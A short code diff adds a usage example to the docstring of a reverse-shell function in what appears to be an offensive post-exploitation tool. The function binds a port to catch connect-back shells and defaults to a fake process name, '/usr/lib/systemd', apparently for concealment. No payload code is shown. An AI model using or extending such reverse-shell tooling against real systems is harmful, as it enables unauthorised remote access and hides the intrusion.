@@ -27,6 +27,8 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     shell
 
     Bind a port and wait for target connect back to get a full shell.
+
+    eg: reshell {lhost} {port} {type=[python|script|upload]{1|2|3},default = 0 (Python:1 Not Python:3)} {(Only for Mode 2) fakename=/usr/lib/systemd}
     """
     if (is_windows(False) or is_windows()):
         print(color.red(f"Only for both system is linux."))
